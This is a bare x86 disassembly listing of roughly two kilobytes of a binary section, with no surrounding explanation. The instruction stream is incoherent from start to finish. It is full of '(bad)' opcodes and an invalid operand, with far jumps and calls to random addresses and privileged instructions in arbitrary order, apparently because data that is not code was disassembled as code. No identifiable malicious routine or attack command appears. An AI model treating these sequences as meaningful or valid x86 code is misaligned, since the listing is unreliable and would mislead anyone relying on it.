  402a1f:	jg     0x402a66
  402a21:	es pop ecx
  402a23:	push   eax
  402a24:	inc    BYTE PTR [eax+0x3885ca94]
  402a2a:	shl    BYTE PTR [ecx-0x2e],1
  402a2d:	lods   eax,DWORD PTR ds:[esi]
  402a2e:	jns    0x4029d8
  402a30:	(bad)  
  402a31:	xchg   edi,eax
  402a32:	repz dec ecx
  402a34:	inc    edx
  402a35:	pusha  
  402a36:	mov    dh,0x6b
  402a38:	fcomp  QWORD PTR [edx]
  402a3a:	repz lea ebx,[ebx+0x7d1eff8f]
  402a41:	xchg   cx,ax
  402a43:	fwait
  402a44:	jmp    0xd1f2c9ec
  402a49:	and    eax,0xa9984b68
  402a4e:	js     0x402a97
  402a50:	hlt    
  402a51:	fistp  DWORD PTR [esi-0x59]
  402a54:	mov    ebx,0x375dbcd
  402a59:	cs (bad) 
  402a5b:	pop    esp
  402a5c:	aad    0x18
  402a5e:	jmp    0x1a7e5d9
  402a63:	jnp    0x402a96
  402a65:	test   al,0x7c
  402a67:	lahf   
  402a68:	lods   eax,DWORD PTR ds:[esi]
  402a69:	leave  
  402a6a:	xor    al,0x65
  402a6c:	pop    edx
  402a6d:	aad    0xc9
  402a6f:	push   ecx
  402a70:	inc    esp
  402a71:	loop   0x402a3b
  402a73:	xlat   BYTE PTR ds:[ebx]
  402a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a75:	adc    BYTE PTR [edx-0x10bc38c2],bl
  402a7b:	inc    esi
  402a7c:	cli    
  402a7d:	outs   dx,BYTE PTR ds:[esi]
  402a7e:	pop    es
  402a7f:	push   eax
  402a80:	sbb    DWORD PTR [ecx+edx*2-0x62216079],ebx
  402a87:	xchg   edi,eax
  402a88:	xlat   BYTE PTR ds:[ebx]
  402a89:	jmp    0x6f0b:0x96283ee1
  402a90:	add    esp,edi
  402a92:	cmp    ch,BYTE PTR [ebp+0x2bb8c2b8]
  402a98:	(bad)  
  402a99:	xor    dl,bh
  402a9b:	or     esp,esi
  402a9d:	adc    al,0x71
  402a9f:	add    al,0x49
  402aa1:	inc    edx
  402aa2:	retf   
  402aa3:	sti    
  402aa4:	and    cl,BYTE PTR [edi+0x2f]
  402aa7:	push   cs
  402aa8:	or     BYTE PTR [ebx+0x68],dh
  402aab:	jnp    0x402af0
  402aad:	repnz mov ebp,DWORD PTR [ebp-0xb97c1cd]
  402ab4:	xchg   ebp,eax
  402ab5:	or     ah,BYTE PTR [eax-0x34ff4359]
  402abb:	sbb    al,0xec
  402abd:	and    DWORD PTR [ebp+0x48069070],esi
  402ac3:	push   0x6c5e18a3
  402ac8:	bound  edx,QWORD PTR [eax+0x34]
  402acb:	imul   ebp,ebp,0x28
  402ace:	mov    dl,0xe3
  402ad0:	mul    BYTE PTR [eax+0x17]
  402ad3:	or     ebp,ebx
  402ad5:	cwde   
  402ad6:	or     al,0x21
  402ad8:	nop
  402ad9:	out    dx,al
  402ada:	xor    esi,DWORD PTR [ebx]
  402adc:	icebp  
  402add:	pop    esp
  402ade:	and    DWORD PTR [ecx],ecx
  402ae0:	test   eax,0xb57f9a3a
  402ae5:	add    DWORD PTR [ebp-0x5a],0xfffffff4
  402ae9:	mov    edi,0x5a41422c
  402aee:	xor    ch,BYTE PTR [edi+ecx*8+0x74fd96b8]
  402af5:	loop   0x402b59
  402af7:	loopne 0x402aa0
  402af9:	add    DWORD PTR [edx+0x4],0x4a2e43ac
  402b00:	adc    al,al
  402b02:	or     BYTE PTR ds:0x9a525df2,bh
  402b08:	int    0xe2
  402b0a:	daa    
  402b0b:	and    al,0xe0
  402b0d:	push   ebx
  402b0e:	cwde   
  402b0f:	push   esi
  402b10:	ins    BYTE PTR es:[edi],dx
  402b11:	xchg   edi,eax
  402b12:	out    0x6f,eax
  402b14:	fldcw  WORD PTR [ebx-0x174dd36]
  402b1a:	mov    dl,0xcf
  402b1c:	adc    edx,DWORD PTR [edi]
  402b1e:	(bad)
  402b21:	ds repnz sti 
  402b24:	test   BYTE PTR [edx+0x1c1c41cf],dh
  402b2a:	and    BYTE PTR [eax-0x6a876f39],bh
  402b30:	inc    esi
  402b31:	push   es
  402b32:	popa   
  402b33:	fidivr DWORD PTR [ebx+0x5e]
  402b36:	sahf   
  402b37:	test   DWORD PTR [eax],edx
  402b39:	mov    al,BYTE PTR [eax-0x73]
  402b3c:	cli    
  402b3d:	nop
  402b3e:	sub    DWORD PTR [ecx],0xfffffffa
  402b41:	inc    edx
  402b42:	and    DWORD PTR [eax-0x4f],edx
  402b45:	je     0x402b67
  402b47:	cld    
  402b48:	(bad)  
  402b49:	test   eax,0x57316c68
  402b4e:	cld    
  402b4f:	mov    ah,BYTE PTR [eax+0x66]
  402b52:	fwait
  402b53:	push   ecx
  402b54:	xor    DWORD PTR [esi-0x3],edx
  402b57:	out    0x64,eax
  402b59:	pop    ss
  402b5a:	addr16 dec ecx
  402b5c:	pop    ss
  402b5d:	ins    DWORD PTR es:[edi],dx
  402b5e:	in     al,0x3e
  402b60:	rcr    bl,1
  402b62:	scas   al,BYTE PTR es:[edi]
  402b63:	dec    ecx
  402b64:	mov    eax,es:0x4b68d29
  402b6a:	adc    eax,0x3dbe19d2
  402b6f:	or     eax,0xa7e3b53b
  402b74:	pop    ebp
  402b75:	pop    ebx
  402b76:	and    DWORD PTR [edi-0x49],esp
  402b79:	mov    dl,BYTE PTR [edi+ebp*4+0x61]
  402b7d:	lods   al,BYTE PTR ds:[esi]
  402b7e:	jae    0x402b7c
  402b80:	repnz push ebx
  402b82:	xchg   DWORD PTR [esi+0xf2a36c7],edi
  402b88:	imul   eax,edx,0x41b472c5
  402b8e:	mov    fs,eax
  402b90:	mov    edi,0xcee99dfa
  402b95:	test   ah,cl
  402b97:	mov    ch,0xbe
  402b99:	lahf   
  402b9a:	sub    DWORD PTR [esi-0x6699441b],edi
  402ba0:	bound  edx,QWORD PTR [esp+ebx*1+0x2a4eaa19]
  402ba7:	push   eax
  402ba8:	imul   eax,DWORD PTR [eax+0x2c1e5390],0x1d7771cc
  402bb2:	test   BYTE PTR [eax+0x10],0x56
  402bb6:	es stos DWORD PTR es:[edi],eax
  402bb8:	ins    BYTE PTR es:[edi],dx
  402bb9:	xor    BYTE PTR [esi-0x3268f605],dl
  402bbf:	dec    edi
  402bc0:	pop    esi
  402bc1:	(bad)  
  402bc2:	in     al,dx
  402bc3:	and    DWORD PTR [esi-0x29acabba],ebx
  402bc9:	pop    ss
  402bca:	ret    
  402bcb:	fmul   DWORD PTR [edx-0x4df7a4b5]
  402bd1:	into   
  402bd2:	pop    es
  402bd3:	test   al,0x79
  402bd5:	test   ebx,ecx
  402bd7:	push   esp
  402bd8:	aam    0x12
  402bda:	sahf   
  402bdb:	jle    0x402b66
  402bdd:	stos   DWORD PTR es:[edi],eax
  402bde:	mov    esi,0xbab53541
  402be3:	sbb    dl,al
  402be5:	push   0x97424f2f
  402bea:	or     DWORD PTR [ebx-0x68],0xfffffff0
  402bee:	call   0x92e0:0x15fdc708
  402bf5:	hlt    
  402bf6:	fisub  DWORD PTR [edi-0x34e95118]
  402bfc:	retf   0xff12
  402bff:	cs popf 
  402c01:	scas   al,BYTE PTR es:[edi]
  402c02:	mov    ah,0x23
  402c04:	pop    ecx
  402c05:	ins    BYTE PTR es:[edi],dx
  402c06:	cmp    ecx,esp
  402c08:	inc    esp
  402c09:	fild   QWORD PTR ds:0xd044ce14
  402c0f:	stos   DWORD PTR es:[edi],eax
  402c10:	jecxz  0x402bd3
  402c12:	xor    bh,BYTE PTR [ebx-0xe]
  402c15:	and    eax,0x41364c11
  402c1a:	xchg   edi,eax
  402c1b:	ss pop ecx
  402c1d:	push   ebp
  402c1e:	cmp    ebp,esi
  402c20:	pop    ds
  402c21:	push   0xb672c258
  402c26:	jns    0x402bfb
  402c28:	cmova  edi,DWORD PTR [edi+0x43767871]
  402c2f:	mov    BYTE PTR [edx+ebp*2+0x50c3d59b],ah
  402c36:	test   al,0x63
  402c38:	xchg   edi,eax
  402c39:	aad    0x7
  402c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c3c:	sbb    ah,BYTE PTR [edi-0x54]
  402c3f:	sbb    bh,bl
  402c41:	fmul   DWORD PTR [edi+0x7a]
  402c44:	or     DWORD PTR [eax+0x5b39c49e],edx
  402c4a:	ss in  al,0xb5
  402c4d:	nop
  402c4e:	inc    eax
  402c4f:	or     eax,0x8754d333
  402c54:	mov    dh,0x91
  402c56:	lahf   
  402c57:	sbb    eax,0x5dbd98a6
  402c5c:	hlt    
  402c5d:	dec    edx
  402c5e:	ret    0x7574
  402c61:	and    dl,BYTE PTR [ebp-0x185f1047]
  402c67:	mov    eax,ds:0x1cd8b32e
  402c6c:	jne    0x402cba
  402c6e:	shl    ah,1
  402c70:	(bad)  
  402c71:	push   eax
  402c72:	mov    dl,0xde
  402c74:	std    
  402c75:	sahf   
  402c76:	mov    dl,0xbf
  402c78:	outs   dx,BYTE PTR ds:[esi]
  402c79:	mov    ebx,0xa2b611e7
  402c7e:	ss (bad) 
  402c80:	popf   
  402c81:	(bad)  
  402c82:	scas   al,BYTE PTR es:[edi]
  402c83:	cmp    DWORD PTR [ebp+edi*8+0x485af572],ebx
  402c8a:	mov    ah,0x53
  402c8c:	loope  0x402c13
  402c8e:	or     eax,DWORD PTR [ebx]
  402c90:	sar    BYTE PTR [edi],0x83
  402c93:	test   eax,0xd08b819a
  402c98:	fst    st(6)
  402c9a:	mov    edi,0xc341b138
  402c9f:	mov    dl,0x6d
  402ca1:	cld    
  402ca2:	mov    ebp,0x493442a0
  402ca7:	aad    0x2
  402ca9:	retf   0x5c07
  402cac:	dec    ebx
  402cad:	jmp    0x402c47
  402caf:	loope  0x402d19
  402cb1:	jl     0x402cc5
  402cb3:	jns    0x402cbc
  402cb5:	xor    ecx,DWORD PTR [ecx+0x7]
  402cb8:	jge    0x402c78
  402cba:	dec    ebx
  402cbb:	fstp   TBYTE PTR [eax+eax*4]
  402cbe:	or     al,0xd4
  402cc0:	adc    bh,BYTE PTR [edx]
  402cc2:	jnp    0x402cdd
  402cc4:	std    
  402cc5:	or     al,0xb2
  402cc7:	sbb    al,0xa2
  402cc9:	shl    DWORD PTR [edx-0x7a],0xb3
  402ccd:	rcl    ah,cl
  402ccf:	inc    ax
  402cd1:	mov    ebp,0x4277d1c2
  402cd6:	int3   
  402cd7:	inc    eax
  402cd8:	or     DWORD PTR [eax+edi*1-0x483d33b5],ecx
  402cdf:	or     ecx,esi
  402ce1:	mov    eax,ds:0x11fdd847
  402ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ce7:	cmp    al,BYTE PTR [edi+0x3856e123]
  402ced:	sub    DWORD PTR [ebx-0x6d259ee6],esp
  402cf3:	ins    BYTE PTR es:[edi],dx
  402cf4:	clc    
  402cf5:	and    DWORD PTR [ebx+0x48604983],0x69
  402cfc:	loopne 0x402d18
  402cfe:	mov    ch,0xa2
  402d00:	adc    BYTE PTR [esi+ecx*2-0x481c6cfa],dh
  402d07:	adc    edx,DWORD PTR [edi+0x2d]
  402d0a:	out    dx,eax
  402d0b:	adc    BYTE PTR [eax+0x2b],0x7e
  402d0f:	mov    cl,0x2
  402d11:	push   esi
  402d12:	and    ch,bl
  402d14:	jge    0x402d04
  402d16:	ja     0x402d16
  402d18:	ins    DWORD PTR es:[edi],dx
  402d19:	daa    
  402d1a:	lds    ecx,FWORD PTR [ecx-0x77a51773]
  402d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d21:	jmp    0x97852e59
  402d26:	pop    edi
  402d27:	stos   DWORD PTR es:[edi],eax
  402d28:	xor    ecx,DWORD PTR [edx+0x35]
  402d2b:	imul   edx,DWORD PTR [edx-0x60cd650c],0x69
  402d32:	imul   esp,DWORD PTR [eax],0x4
  402d35:	lock retf 0x3c6
  402d39:	mov    cl,0xfa
  402d3b:	jno    0x402d87
  402d3d:	ror    DWORD PTR [ecx],1
  402d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d40:	aam    0xcd
  402d42:	cmp    dh,ah
  402d44:	xor    edi,DWORD PTR [esi]
  402d46:	not    ebp
  402d48:	dec    edx
  402d49:	in     al,dx
  402d4a:	inc    ebx
  402d4b:	cld    
  402d4c:	cli    
  402d4d:	jmp    0x3e225cfb
  402d52:	(bad)  
  402d53:	jno    0x402d04
  402d55:	sbb    eax,0x6d39d1cb
  402d5a:	push   cs
  402d5b:	cmp    bl,BYTE PTR [ebx-0x395ffec8]
  402d61:	test   eax,0xe77ac6c2
  402d66:	jecxz  0x402dd1
  402d68:	mov    esp,0xe9e5c037
  402d6d:	lods   eax,DWORD PTR ds:[esi]
  402d6e:	cmp    DWORD PTR [eax-0x6f],0xca111815
  402d75:	aas    
  402d76:	gs ret 0x6f28
  402d7a:	pushf  
  402d7b:	sets   BYTE PTR [edi]
  402d7e:	ror    DWORD PTR [ebx+0x5efc0dad],0x30
  402d85:	jb     0x402d62
  402d87:	test   DWORD PTR [edi],ecx
  402d89:	hlt    
  402d8a:	jmp    0x7fb0:0xc7fd4155
  402d91:	add    BYTE PTR [eax+ecx*1],dh
  402d94:	cli    
  402d95:	push   ds
  402d96:	xor    al,0xb6
  402d98:	fdivr  QWORD PTR [edi-0x1]
  402d9b:	or     cl,ch
  402d9d:	cld    
  402d9e:	into   
  402d9f:	add    al,0xe
  402da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402da2:	ins    DWORD PTR es:[edi],dx
  402da3:	ret    0x5dd4
  402da6:	or     eax,ecx
  402da8:	adc    ch,BYTE PTR [eax+0x4f]
  402dab:	pop    ds
  402dac:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  402dae:	mov    edi,0x3fb2c833
  402db3:	(bad)  
  402db4:	mov    ch,0xd7
  402db6:	mov    DWORD PTR [edi-0x47],0x5f66ca64
  402dbd:	xchg   edi,eax
  402dbe:	mov    al,ds:0xdf511a95
  402dc3:	jns    0x402e1d
  402dc5:	mov    bl,0x62
  402dc7:	and    DWORD PTR [ecx],0xffffffd1
  402dca:	(bad)  
  402dcb:	push   edx
  402dcc:	cs pop ss
  402dce:	mov    bh,0x5
  402dd0:	nop
  402dd1:	inc    dh
  402dd3:	mov    edx,0xbc3dc799
  402dd8:	mov    edx,0x988ba43c
  402ddd:	mov    bh,0x6b
  402ddf:	jae    0x402e0c
  402de1:	mov    dl,0x2c
  402de3:	into   
  402de4:	or     edx,DWORD PTR [eax+0x30a0ceac]
  402dea:	sub    dl,0x64
  402ded:	(bad)  
  402dee:	repz aaa 
  402df0:	mov    WORD PTR [edi+0x20],ss
  402df3:	sub    DWORD PTR [ebx-0x5d955ea3],0xffffffb9
  402dfa:	ins    BYTE PTR es:[edi],dx
  402dfb:	xchg   esi,eax
  402dfc:	mov    bl,0x3c
  402dfe:	pop    es
  402dff:	and    eax,0x7400b390
  402e04:	retf   
  402e05:	pop    ds
  402e06:	aas    
  402e07:	div    BYTE PTR [edx-0x8]
  402e0a:	dec    edx
  402e0b:	or     DWORD PTR [ecx+0x18],0x3f1a3843
  402e12:	out    dx,al
  402e13:	jo     0x402e5c
  402e15:	lods   eax,DWORD PTR ds:[esi]
  402e16:	addr16 je 0x402db7
  402e19:	dec    ebx
  402e1a:	jns    0x402e7e
  402e1c:	add    eax,0x93e567ee
  402e21:	and    eax,0x5d14d57
  402e26:	adc    esi,ecx
  402e28:	pop    ebx
  402e29:	(bad)  
  402e2a:	in     al,dx
  402e2b:	sub    al,0xd8
  402e2d:	inc    edi
  402e2e:	mov    ebx,DWORD PTR [edx+0x39999c0]
  402e34:	push   esi
  402e35:	adc    BYTE PTR [ecx+0x323cdacd],cl
  402e3b:	dec    esp
  402e3c:	pushf  
  402e3d:	shl    BYTE PTR [esi],1
  402e3f:	jg     0x402dff
  402e41:	fcomp  DWORD PTR [edi]
  402e43:	cmp    bl,BYTE PTR [ebx-0x44cf44e]
  402e49:	mov    bl,0x7
  402e4b:	push   eax
  402e4c:	shl    DWORD PTR [eax-0x655287fd],0xb0
  402e53:	test   DWORD PTR [ebx-0x3ba9cb51],edx
  402e59:	inc    DWORD PTR [ebx+0x4b]
  402e5c:	rol    DWORD PTR [edi],0xe2
  402e5f:	cmp    DWORD PTR [ebx-0xc],edi
  402e62:	jnp    0x402e85
  402e64:	push   esi
  402e65:	cmp    dl,BYTE PTR ds:0x2ac5355c
  402e6b:	mov    eax,0xc2d3ba6a
  402e70:	cld    
  402e71:	pop    ss
  402e72:	out    dx,al
  402e73:	test   eax,0xea0b0af4
  402e78:	push   0x6f
  402e7a:	inc    ebx
  402e7b:	push   ss
  402e7c:	cs pop edi
  402e7e:	fild   DWORD PTR [ebx-0x27]
  402e81:	(bad)  
  402e82:	push   ecx
  402e83:	test   al,0xeb
  402e85:	pop    ecx
  402e86:	jne    0x402ebe
  402e88:	mov    esp,0x7e940453
  402e8d:	jbe    0x402e44
  402e8f:	fwait
  402e90:	call   0x68d1acb4
  402e95:	inc    esi
  402e96:	out    0xe9,al
  402e98:	call   0xb871:0x3eb70f8f
  402e9f:	rcr    edi,cl
  402ea1:	aam    0x56
  402ea3:	mov    dh,0xc9
  402ea5:	cmp    ebp,DWORD PTR [edi+ebp*1+0x5d]
  402ea9:	sbb    ebp,DWORD PTR [esi]
  402eab:	inc    esi
  402eac:	xor    eax,0x9bef13f1
  402eb1:	cld    
  402eb2:	sbb    DWORD PTR [ecx-0x65],eax
  402eb5:	neg    ebx
  402eb7:	pop    ecx
  402eb8:	(bad)  
  402eb9:	and    DWORD PTR [eax],edi
  402ebb:	and    eax,0x856d1897
  402ec0:	push   esp
  402ec1:	(bad)  
  402ec2:	cld    
  402ec3:	sbb    BYTE PTR [esi-0x180f648e],cl
  402ec9:	push   ebx
  402eca:	cmp    dh,BYTE PTR [edx-0x77]
  402ecd:	or     BYTE PTR [edi+0x4a0011bb],bl
  402ed3:	leave  
  402ed4:	sbb    dl,bl
  402ed6:	and    DWORD PTR [esi],ecx
  402ed8:	dec    ebx
  402ed9:	stc    
  402eda:	ins    BYTE PTR es:[edi],dx
  402edb:	gs mov dl,0xfe
  402ede:	lds    eax,FWORD PTR [edx+esi*4+0x14434dbd]
  402ee5:	imul   DWORD PTR [esi]
  402ee7:	jg     0x402ec8
  402ee9:	fstp   TBYTE PTR [eax-0x7ee9d571]
  402eef:	daa    
  402ef0:	imul   ebp,DWORD PTR [esi+0xa665eba],0x871f2872
  402efa:	in     al,dx
  402efb:	repnz dec eax
  402efd:	push   ebp
  402efe:	jns    0x402f16
  402f00:	icebp  
  402f01:	inc    eax
  402f02:	push   esp
  402f03:	cmp    al,0xf9
  402f05:	sahf   
  402f06:	std    
  402f07:	lea    ebp,[ebx+0x6a]
  402f0a:	fidivr WORD PTR [ebp-0x120743cf]
  402f10:	jp     0x402ea7
  402f12:	xor    DWORD PTR [edi+0x48],edi
  402f15:	cwde   
  402f16:	push   0x3a66e244
  402f1b:	(bad)  
  402f1c:	repz jmp 0x402ee9
  402f1f:	ds jno 0x402f18
  402f22:	retf   
  402f23:	lds    esi,FWORD PTR [edx+0x6c]
  402f26:	mov    edx,0x903c0311
  402f2b:	sub    al,0x7
  402f2d:	mov    edx,0x2710503b
  402f32:	inc    eax
  402f33:	dec    ecx
  402f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f35:	das    
  402f36:	inc    edx
  402f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f38:	iret   
  402f39:	popf   
  402f3a:	xchg   DWORD PTR ds:0xd87adb06,eax
  402f40:	shl    ah,1
  402f42:	add    esp,DWORD PTR [esi+0x5b51306e]
  402f48:	out    dx,al
  402f49:	add    eax,0x32303123
  402f4e:	inc    edx
  402f4f:	data16 (bad) 
  402f51:	fld    QWORD PTR [eax+0xd]
  402f54:	jb     0x402f9b
  402f56:	add    al,0x62
  402f58:	js     0x402fba
  402f5a:	jbe    0x402f4b
  402f5c:	jge    0x402fca
  402f5e:	repz hlt 
  402f60:	test   dh,dh
  402f62:	sub    esp,DWORD PTR [eax]
  402f64:	mov    edi,DWORD PTR [edi+0x3a]
  402f67:	jo     0x402f7c
  402f69:	jns    0x402f93
  402f6b:	pop    ss
  402f6c:	(bad)  
  402f6e:	mov    ecx,0x69fc5d7e
  402f73:	mov    al,0xca
  402f75:	retf   
  402f76:	and    BYTE PTR [ebp+0x60669954],cl
  402f7c:	bound  ebx,QWORD PTR [ecx]
  402f7e:	or     BYTE PTR [ecx+ebp*4],ch
  402f81:	mov    es,WORD PTR [ebp+0x21]
  402f84:	cmp    eax,0x7671fcf9
  402f89:	inc    ebp
  402f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f8b:	xlat   BYTE PTR ds:[ebx]
  402f8c:	outs   dx,BYTE PTR ds:[esi]
  402f8d:	adc    edx,ebp
  402f8f:	inc    ecx
  402f90:	xchg   ecx,eax
  402f91:	xor    al,0xd1
  402f93:	ret    0x221d
  402f96:	call   0xf713:0x92659e60
  402f9d:	iret   
  402f9e:	jmp    0x7ce3:0xbd42bfd2
  402fa5:	add    al,0x8b
  402fa7:	sbb    al,BYTE PTR [eax+edi*2+0x42]
  402fab:	sub    al,0xaa
  402fad:	xchg   ebx,eax
  402fae:	out    0x6,eax
  402fb0:	mov    esp,DWORD PTR [esi-0x13]
  402fb3:	inc    ebx
  402fb4:	les    ebp,FWORD PTR [edi+0x62ecc59f]
  402fba:	inc    edx
  402fbb:	out    dx,eax
  402fbc:	add    al,0xc8
  402fbe:	enter  0xcbee,0x3e
  402fc2:	xchg   BYTE PTR [ebx+esi*4-0x80],ah
  402fc6:	xchg   edx,eax
  402fc7:	jmp    0xdb56f341
  402fcc:	pop    esi
  402fcd:	(bad)  
  402fce:	xchg   edi,eax
  402fcf:	sub    ah,ch
  402fd1:	test   BYTE PTR [ecx],cl
  402fd3:	and    BYTE PTR [edx],al
  402fd5:	or     cl,BYTE PTR [ecx+0x70251d4a]
  402fdb:	push   cs
  402fdc:	mov    cl,0xce
  402fde:	xchg   esi,eax
  402fdf:	and    al,0x74
  402fe1:	sbb    DWORD PTR [edx+0x3b4fe17b],ebx
  402fe7:	mov    edx,0x26b08e5c
  402fec:	add    BYTE PTR [edx+0x75d97ab],ch
  402ff2:	cmp    al,0x71
  402ff4:	int    0x4c
  402ff6:	sar    ebp,cl
  402ff8:	inc    eax
  402ff9:	adc    al,BYTE PTR [ebx-0x29e0cf38]
  402fff:	mov    cl,0x60
  403001:	adc    eax,0x35006b26
  403006:	push   ebp
  403007:	mov    cl,BYTE PTR [edx+eax*4]
  40300a:	mov    eax,0x98c62e21
  40300f:	loopne 0x403064
  403011:	sub    BYTE PTR [ebp+0x1d],0x37
  403015:	mov    ?,WORD PTR [eax*2+0x2765a8d]
  40301c:	scas   eax,DWORD PTR es:[edi]
  40301d:	imul   ebx,DWORD PTR [ebx+0x49],0x49e722b
  403024:	idiv   ebx
  403026:	inc    ecx
  403027:	gs icebp 
  403029:	mov    dl,0x4
  40302b:	cmc    
  40302c:	push   edx
  40302d:	add    al,0x43
  40302f:	pop    ss
  403030:	ret    
  403031:	imul   esp,DWORD PTR [edi-0x5f],0xffffffc0
  403035:	sub    esp,DWORD PTR [ebx+0x44]
  403038:	stc    
  403039:	fisttp QWORD PTR [ebx+0x1]
  40303c:	mov    DWORD PTR [esi+edx*2+0x26d475b1],ebx
  403043:	sbb    ah,cl
  403045:	xor    eax,0x3327469b
  40304a:	inc    esp
  40304b:	sbb    eax,0x31c81f85
  403050:	out    0xfc,al
  403052:	mov    al,0x1d
  403054:	in     al,dx
  403055:	ss in  eax,0xb5
  403058:	hlt    
  403059:	xor    al,0x9c
  40305b:	mov    esp,0x748618b9
  403060:	fistp  WORD PTR [eax]
  403062:	sbb    DWORD PTR [edx+0x6f],esp
  403065:	sub    DWORD PTR [ebp-0x37],ebp
  403068:	add    DWORD PTR [edi+0x1e],ebp
  40306b:	(bad)
  40306f:	and    ecx,ebx
  403071:	xlat   BYTE PTR ds:[ebx]
  403072:	ret    0x1d8b
  403075:	or     ebx,DWORD PTR [edi+0x315f5301]
  40307b:	dec    ebp
  40307c:	cdq    
  40307d:	xor    BYTE PTR [esi-0x72d1d786],al
  403083:	pop    edi
  403084:	cmp    al,0xc5
  403086:	sahf   
  403087:	pop    ebp
  403088:	xor    DWORD PTR [edi+0x58a77996],esi
  40308e:	push   ebp
  40308f:	pop    edi
  403090:	adc    eax,0xf282d731
  403095:	ins    BYTE PTR es:[edi],dx
  403096:	imul   edx,DWORD PTR [edx+0x71a10e84],0x7726ff65
  4030a0:	mov    cs:0x1884b766,eax
  4030a6:	push   ecx
  4030a7:	sub    cl,BYTE PTR [esi+0x5d]
  4030aa:	jmp    0x403126
  4030ac:	sahf   
  4030ad:	add    eax,0x64046483
  4030b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030b3:	mov    ebx,0x2897da71
  4030b8:	push   ebp
  4030b9:	lahf   
  4030ba:	(bad)  
  4030bc:	mov    bh,0x4b
  4030be:	and    BYTE PTR [esi],dh
  4030c0:	bound  ebx,QWORD PTR [edi+0x70]
  4030c3:	lods   al,BYTE PTR ds:[esi]
  4030c4:	sub    BYTE PTR [esi],bl
  4030c6:	(bad)  
  4030c8:	sar    al,cl
  4030ca:	outs   dx,DWORD PTR ds:[esi]
  4030cb:	shl    DWORD PTR [ebp+edx*2+0x5a595423],cl
  4030d2:	jmp    0x403134
  4030d4:	(bad)  
  4030d6:	bound  edx,QWORD PTR [eax+edx*2-0x693b6bd5]
  4030dd:	mov    dl,0x83
  4030df:	dec    edi
  4030e0:	lock push sp
  4030e3:	test   BYTE PTR [eax],ah
  4030e5:	adc    ebx,DWORD PTR [ecx]
  4030e7:	es jns 0x403096
  4030ea:	(bad)  
  4030eb:	push   edx
  4030ec:	mov    bl,0xcb
  4030ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030f0:	mov    eax,0x7c8acfea
  4030f5:	pop    edi
  4030f6:	jae    0x4030e1
  4030f8:	jmp    DWORD PTR [ebx-0xd]
  4030fb:	mov    bx,0x8cc5
  4030ff:	fld    st(4)
  403101:	mov    ebx,0x18d046f3
  403106:	pusha  
  403107:	nop
  403108:	dec    esp
  403109:	fcmovnu st,st(1)
  40310b:	idiv   ah
  40310d:	push   ebp
  40310e:	mov    ch,BYTE PTR [ebp-0x6c]
  403111:	aaa    
  403112:	add    eax,0xd3f38ae7
  403117:	sub    BYTE PTR [esi+0x52028c21],dl
  40311d:	ror    BYTE PTR [eax],0x91
  403120:	and    DWORD PTR cs:[ecx+0x3ccfec59],ecx
  403127:	popa   
  403128:	lea    eax,[edx-0x4bde2d2b]
  40312e:	mov    BYTE PTR [edx+0x24d471d6],0xf8
  403135:	ins    DWORD PTR es:[edi],dx
  403136:	lahf   
  403137:	outs   dx,DWORD PTR ds:[esi]
  403138:	stos   BYTE PTR es:[edi],al
  403139:	mov    ds:0x2c6afdf,al
  40313e:	dec    ecx
  40313f:	dec    edi
  403140:	stos   DWORD PTR es:[edi],eax
  403141:	fld    st(2)
  403143:	jno    0x4030d1
  403145:	mov    bl,0x26
  403147:	les    ecx,FWORD PTR ds:0xc8176e0
  40314d:	mov    ch,0xe4
  40314f:	and    DWORD PTR [esi],ebx
  403151:	push   0x44
  403153:	mov    eax,ds:0x4a6537bc
  403158:	cmc    
  403159:	and    ecx,DWORD PTR [eax+edx*4]
  40315c:	leave  
  40315d:	(bad)  
  40315e:	mov    ds:0x24950692,eax
  403163:	lods   eax,DWORD PTR ds:[esi]
  403164:	daa    
  403165:	stc    
  403166:	adc    eax,0x1d9d7133
  40316b:	out    dx,al
  40316c:	adc    esi,DWORD PTR [eax]
  40316e:	ret    
  40316f:	inc    esi
  403170:	in     eax,dx
  403171:	movhps QWORD PTR [edi],xmm2
  403174:	dec    esp
  403175:	dec    esp
  403176:	fwait
  403177:	sbb    eax,0xd8bff03c
  40317c:	es stos DWORD PTR es:[edi],eax
  40317e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40317f:	adc    eax,0xa994f3dc
  403184:	mov    ah,0x54
  403186:	neg    ch
  403188:	loop   0x40319b
  40318a:	test   al,0xf
  40318c:	pop    ss
  40318d:	add    ch,BYTE PTR [eax]
  40318f:	mov    ebx,0xf9e425ec
  403194:	test   eax,ebp
  403196:	pusha  
  403197:	sub    al,0x1d
  403199:	add    ecx,DWORD PTR [ebx-0x3b]
  40319c:	arpl   WORD PTR [esi-0x71],si
  40319f:	pushf  
  4031a0:	in     eax,dx
  4031a1:	or     BYTE PTR [ebp-0x16],dl
  4031a4:	mov    al,ds:0xe82ea32f
  4031a9:	neg    DWORD PTR [ecx]
  4031ab:	xor    eax,0xe33e51c8
  4031b0:	int    0x53
  4031b2:	shr    DWORD PTR [ebp+0x1],cl
  4031b5:	inc    ebp
  4031b6:	and    ebx,DWORD PTR [eax-0x58]
  4031b9:	jecxz  0x403208
  4031bb:	cmc    
  4031bc:	mov    esi,0x2238c2e4
  4031c1:	push   eax
  4031c2:	pop    esp
  4031c3:	test   eax,0x12896757
  4031c8:	xor    bl,cl
  4031ca:	scas   al,BYTE PTR es:[edi]
  4031cb:	pop    ebx
  4031cc:	sbb    ch,BYTE PTR [ebx]
  4031ce:	jge    0x40322b
  4031d0:	inc    ebp
  4031d1:	fmulp  st(6),st
  4031d3:	cs push ecx
  4031d5:	das    
  4031d6:	(bad)  
  4031d7:	lea    esi,[ebx-0x6e]
  4031da:	mov    al,ds:0x1f46709c
  4031df:	(bad)  
  4031e0:	aad    0x8c
  4031e2:	shr    BYTE PTR [eax-0x1386c942],1
  4031e8:	push   esp
